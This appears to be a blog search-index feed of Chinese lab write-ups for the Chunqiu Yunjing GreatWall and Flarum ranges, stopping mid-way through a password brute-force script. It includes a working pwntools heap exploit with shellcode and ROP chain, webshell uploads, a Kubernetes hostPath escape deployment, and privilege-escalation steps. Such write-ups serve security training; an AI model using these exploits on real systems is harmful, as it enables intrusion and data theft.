<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>春秋云境-GreatWall</title>
      <link href="/posts/f8a60ebc/"/>
      <url>/posts/f8a60ebc/</url>
      
        <content type="html"><![CDATA[<p>先扫一波，扫到一个nday</p><figure><imgsrc="/images/春秋云境-GreatWall/1760281925315-fa960cdd-3d03-4f88-bcc6-59af44fc26c3.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写马进去</p><figure><imgsrc="/images/春秋云境-GreatWall/1760282332244-51ab1490-d4e5-42ce-a74e-b45f22a87ddc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>蚁剑连上，拿到第一个flag</p><figure><imgsrc="/images/春秋云境-GreatWall/1760282434884-9a6ca349-87aa-4219-b5bb-8d85041318d7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>传fscan扫内网</p><figure><imgsrc="/images/春秋云境-GreatWall/1760282547566-e96a0271-68b8-44f6-ab70-9240f0c44f2b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>搭建frp</p><figure><imgsrc="/images/春秋云境-GreatWall/1760282639352-469f29d0-0c25-4f63-8771-57f7721bbeec.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-GreatWall/1760282653566-2209478b-4cec-49ba-87f3-84f7f74bd0a7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>前面扫到有一台机器有heapdump泄露，访问172.28.23.33:8080/actuator/heapdump下载下来，然后用JDumpSpider获取key</p><figure><imgsrc="/images/春秋云境-GreatWall/1760283113761-c318321c-10ea-445f-8443-7199b35291cb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>shiro attack写哥斯拉的内存马进去</p><figure><imgsrc="/images/春秋云境-GreatWall/1760283536808-f0954dcd-82c1-42f9-9707-756e7d90c9d6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>哥斯拉连上，是一个低权限用户</p><figure><imgsrc="/images/春秋云境-GreatWall/1760283732949-351992a9-8fcd-4a17-8abb-afb6cfb88bac.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>先看下网络状态，看到在59696端口跑了个服务</p><figure><imgsrc="/images/春秋云境-GreatWall/1760284131302-1c2c2fc4-5e7d-43f6-99d5-6593d0d4dc88.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>切到/home/ops01底下，有个HashNote附件，看来是个pwn题。一点不懂pwn，直接抄作业</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./HashNote&#x27;</span>)</span><br><span class="line">context(<span class="built_in">arch</span>=elf.arch, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./HashNote&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;172.28.23.33&#x27;</span>, 59696)</span><br><span class="line"></span><br><span class="line">def send_command(<span class="built_in">command</span>):</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;: &#x27;</span>, str(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">def add_entry(key, value):</span><br><span class="line">    send_command(1)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Key: &#x27;</span>, key)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Data: &#x27;</span>, value)</span><br><span class="line"></span><br><span class="line">def get_entry(key):</span><br><span class="line">    send_command(2)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Key: &#x27;</span>, key)</span><br><span class="line"></span><br><span class="line">def update_entry(key, value):</span><br><span class="line">    send_command(3)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Key: &#x27;</span>, key)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Data: &#x27;</span>, value)</span><br><span class="line"></span><br><span class="line">def set_username(value):</span><br><span class="line">    send_command(4)</span><br><span class="line">    p.sendafter(b<span class="string">&#x27;New username: &#x27;</span>, value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Authenticate</span></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Username: &#x27;</span>, b<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Password: &#x27;</span>, b<span class="string">&#x27;freep@ssw0rd:3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add entries to setup the environment</span></span><br><span class="line">add_entry(b<span class="string">&#x27;aabP&#x27;</span>, b<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add_entry(b<span class="string">&#x27;aace&#x27;</span>, b<span class="string">&#x27;C&#x27;</span> * 0xc0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shellcode to spawn a shell</span></span><br><span class="line">sc = [</span><br><span class="line">    b<span class="string">&#x27;\x6a\x3b&#x27;</span>,                   <span class="comment"># push   0x3b</span></span><br><span class="line">    b<span class="string">&#x27;\x58&#x27;</span>,                       <span class="comment"># pop    rax</span></span><br><span class="line">    b<span class="string">&#x27;\x99&#x27;</span>,                       <span class="comment"># cdq</span></span><br><span class="line">    b<span class="string">&#x27;\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68&#x27;</span>, <span class="comment"># movabs rbx, 0x68732f6e69622f2f</span></span><br><span class="line">    b<span class="string">&#x27;\x53&#x27;</span>,                       <span class="comment"># push   rbx</span></span><br><span class="line">    b<span class="string">&#x27;\x48\x89\xe7&#x27;</span>,               <span class="comment"># mov    rdi, rsp</span></span><br><span class="line">    b<span class="string">&#x27;\x52&#x27;</span>,                       <span class="comment"># push   rdx</span></span><br><span class="line">    b<span class="string">&#x27;\x57&#x27;</span>,                       <span class="comment"># push   rdi</span></span><br><span class="line">    b<span class="string">&#x27;\x48\x89\xe6&#x27;</span>,               <span class="comment"># mov    rsi, rsp</span></span><br><span class="line">    b<span class="string">&#x27;\x0f\x05&#x27;</span>                    <span class="comment"># syscall</span></span><br><span class="line">]</span><br><span class="line">shellcode = b<span class="string">&#x27;&#x27;</span>.<span class="built_in">join</span>(sc)</span><br><span class="line">username_addr = 0x5dc980</span><br><span class="line">fake_obj_addr = username_addr + 0x10</span><br><span class="line"></span><br><span class="line">def arbitrary_read(addr):</span><br><span class="line">    payload = p64(fake_obj_addr)</span><br><span class="line">    payload += p64(0xdeadbeef)</span><br><span class="line"></span><br><span class="line">    fake_obj = p64(fake_obj_addr + 0x10) + p64(4)</span><br><span class="line">    fake_obj += b<span class="string">&#x27;aahO&#x27;</span>.ljust(0x10, b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_obj += p64(addr) + p64(8) + b<span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload += fake_obj</span><br><span class="line">    payload += shellcode</span><br><span class="line">    payload = payload.ljust(128, b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    set_username(payload)</span><br><span class="line">    get_entry(b<span class="string">&#x27;aahO&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def arbitrary_write(addr, data):</span><br><span class="line">    payload = p64(fake_obj_addr)</span><br><span class="line">    payload += p64(0xdeadbeef)</span><br><span class="line"></span><br><span class="line">    fake_obj = p64(fake_obj_addr + 0x10) + p64(4)</span><br><span class="line">    fake_obj += b<span class="string">&#x27;aahO&#x27;</span>.ljust(0x10, b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_obj += p64(addr) + p64(len(data)) + b<span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload += fake_obj</span><br><span class="line">    payload += shellcode</span><br><span class="line">    payload = payload.ljust(128, b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    set_username(payload)</span><br><span class="line">    update_entry(b<span class="string">&#x27;aahO&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak the stack address</span></span><br><span class="line">environ = 0x5e4c38 </span><br><span class="line">arbitrary_read(environ)</span><br><span class="line">stack_addr = u64((p.recvuntil(b&#x27;\x7f&#x27;, drop=False)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, b&#x27;\<span class="number">0</span>&#x27;)))</span><br><span class="line">success(<span class="string">&#x27;stack_addr&#x27;</span>, stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP gadgets</span></span><br><span class="line">rdi = 0x0000000000405e7c</span><br><span class="line">rsi = 0x000000000040974f</span><br><span class="line">rax = 0x00000000004206ba</span><br><span class="line">rdx_rbx = 0x000000000053514b</span><br><span class="line">shr_eax_2 = 0x0000000000523f2e</span><br><span class="line">syscall_ret = 0x00000000004d9776</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP payload to map memory and jump to shellcode</span></span><br><span class="line">payload = p64(rdi) + p64(username_addr &amp; ~0xfff) + p64(rsi) + p64(0x1000) + p64(rdx_rbx) + p64(7) + p64(0) + p64(rax) + p64(0xa &lt;&lt; <span class="string">2) + p64(shr_eax_2) + p64(syscall_ret) + p64(username_addr + 0x48)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">arbitrary_write(stack_addr - 0x210, payload)</span></span><br><span class="line"><span class="string">p.sendline(b&#x27;uname -ar&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure><p>拿到flag</p><figure><imgsrc="/images/春秋云境-GreatWall/1760284156922-458e7998-e67a-4a64-84d0-ecd0f7abb2f4.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>之前扫到还有一台机器有个匿名ftp，连上去下载到一个网站源码</p><figure><imgsrc="/images/春秋云境-GreatWall/1760343777053-9b01f85a-4190-4cd2-b21f-afb8ec15c0de.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>代码审计，checklogin.php中有个抽象鉴权，每个参数随便写点什么就能登陆</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">islogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;id&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;loginname&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;jueseid&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;danweiid&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;quanxian&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;id&#x27;</span>]!=<span class="string">&#x27;&#x27;</span>&amp;&amp;<span class="variable">$_COOKIE</span>[<span class="string">&#x27;loginname&#x27;</span>]!=<span class="string">&#x27;&#x27;</span>&amp;&amp;<span class="variable">$_COOKIE</span>[<span class="string">&#x27;jueseid&#x27;</span>]!=<span class="string">&#x27;&#x27;</span>&amp;&amp;<span class="variable">$_COOKIE</span>[<span class="string">&#x27;danweiid&#x27;</span>]!=<span class="string">&#x27;&#x27;</span>&amp;&amp;<span class="variable">$_COOKIE</span>[<span class="string">&#x27;quanxian&#x27;</span>]!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-GreatWall/1760344221110-fa10c6f1-8c7b-456e-b877-946f21a0149b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再继续看，发现uploadbase64.php处可以任意文件写，写个马进去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description: PhpStorm.</span></span><br><span class="line"><span class="comment"> * Author: yoby</span></span><br><span class="line"><span class="comment"> * DateTime: 2018/12/4 18:01</span></span><br><span class="line"><span class="comment"> * Email:logove<span class="doctag">@qq</span>.com</span></span><br><span class="line"><span class="comment"> * Copyright Yoby版权所有</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$img</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;imgbase64&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span>, <span class="variable">$img</span>, <span class="variable">$result</span>)) &#123;</span><br><span class="line">    <span class="variable">$type</span> = <span class="string">&quot;.&quot;</span>.<span class="variable">$result</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="variable">$path</span> = <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d&quot;</span>) . <span class="string">&quot;-&quot;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$type</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$img</span> =  <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">str_replace</span>(<span class="variable">$result</span>[<span class="number">1</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$img</span>));</span><br><span class="line">@<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>, <span class="variable">$img</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;&#123;&quot;src&quot;:&quot;&#x27;</span>.<span class="variable">$path</span>.<span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-GreatWall/1760344639040-0345b49b-50f2-4570-ad9b-243c084baa4a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>蚁剑能连上，但是什么都做不了，执行命令会返回ret=127</p><p>看下phpinfo, disable_funtions禁了一堆函数</p><figure><imgsrc="/images/春秋云境-GreatWall/1760345204306-be85fe55-8d6c-4c1e-a060-32c20448704c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用蚁剑的插件绕</p><figure><imgsrc="/images/春秋云境-GreatWall/1760345282653-8adf33f1-262f-451a-b3e7-df8b76d129d7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>新建一个1.php，用GET传参</p><figure><imgsrc="/images/春秋云境-GreatWall/1760345656592-2b86f39d-9e09-4142-a0ce-e9895ad4eec1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在生成的.antproxy.php中改一下路径</p><figure><imgsrc="/images/春秋云境-GreatWall/1760345685027-819b1209-04e3-42b2-aa19-745490e4872b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后访问.antproxy.php执行命令，发现权限比较低，要提权</p><p>看下suid</p><figure><imgsrc="/images/春秋云境-GreatWall/1760345960584-19c65693-6046-4208-878c-561726404e92.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>有个base32能用，拿到flag</p><figure><imgsrc="/images/春秋云境-GreatWall/1760346040757-89f9cf7b-4f20-4786-be97-87fa00fc8f49.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-GreatWall/1760346063099-3d037ca9-15e8-44a9-adf8-653cca37e578.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看下网络，这台机器是双网卡</p><figure><imgsrc="/images/春秋云境-GreatWall/1760346235995-cf196604-fc62-475d-aaf2-f95e57e3a49b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>从最开始的那台机器把fscan和frp传过去，并将其作为frp server</p><p>fscan扫描结果</p><figure><imgsrc="/images/春秋云境-GreatWall/1761318105792-da555fe3-6e9f-402f-a797-c8084a53644e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>harbor存在漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 harbor.py http://172.22.14.46</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-GreatWall/1761318771745-9c25eb7d-8df2-46b2-80fb-b0cc5e125c6a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>下载secret</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 harbor.py http://172.22.14.46/ --dump harbor/secret --v2</span><br></pre></td></tr></table></figure><p>找到flag</p><figure><imgsrc="/images/春秋云境-GreatWall/1761319319895-8ce2e1bf-4af1-4684-97b5-3a90c55b989b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>下载project/projectadmin</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 harbor.py http://172.22.14.46/ --dump project/projectadmin --v2</span><br></pre></td></tr></table></figure><p>发现ProjectAdmin-0.0.1-SNAPSHOT.jar，也就是网站源码</p><p>用jadx逆向一下，发现账号密码</p><figure><imgsrc="/images/春秋云境-GreatWall/1761319841469-4cf8081b-e1c7-4514-a7cb-4cf2243e6e61.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用MUDT连上数据库，UDF提权，读flag</p><figure><imgsrc="/images/春秋云境-GreatWall/1761320058773-368e85c3-2902-42e3-9c11-92bf7853efb8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>最后打一个k8s未授权</p><figure><imgsrc="/images/春秋云境-GreatWall/1761320386380-8ea261f2-b587-481d-8d2e-9f3efbbf4d8e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用下面这个evil-deployment.yaml起一个POD</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#evil-deployment.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-deployment</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.8</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/mnt</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">        <span class="attr">hostPath:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/  apply -f evil-deployment.yaml</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-GreatWall/1761320963290-1184b9d1-95b6-4a10-a3a8-f2f66e96a1bd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>查看POD的名字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-GreatWall/1761320987981-58cf61a2-3655-4d75-9c75-1bba9a9e26f4.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>进入POD</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ <span class="built_in">exec</span> -it nginx-deployment-864f8bfd6f-qqkg5 -- /bin/bash</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-GreatWall/1761321011787-a42adcd5-f11d-4652-a515-99c4b33835af.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写入公钥</p><figure><imgsrc="/images/春秋云境-GreatWall/1761321031433-c288d27e-bc25-415c-af80-0f9cb7711c47.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>ssh连上后mysql -u root登录数据库找到flag</p><figure><imgsrc="/images/春秋云境-GreatWall/1761321076596-a62746e2-e365-4af4-8383-aa6432fe2527.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-GreatWall/1761321091194-2f53c814-a995-46c3-b101-cfe69643261b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2025初赛 Writeup</title>
      <link href="/posts/39a5a39d/"/>
      <url>/posts/39a5a39d/</url>
      
        <content type="html"><![CDATA[<blockquote><p>恐怖本科组，恐怖凌晨战（（</p></blockquote><h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/羊城杯2025Writeup.pdf">Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 羊城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Flarum</title>
      <link href="/posts/f85c7fea/"/>
      <url>/posts/f85c7fea/</url>
      
        <content type="html"><![CDATA[<p>用rockyou.txt爆破后台密码，用户名为administrator</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the target URL and headers based on the provided HTTP request</span></span><br><span class="line">url = <span class="string">&quot;http://39.99.145.57/login&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;39.99.145.57&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, 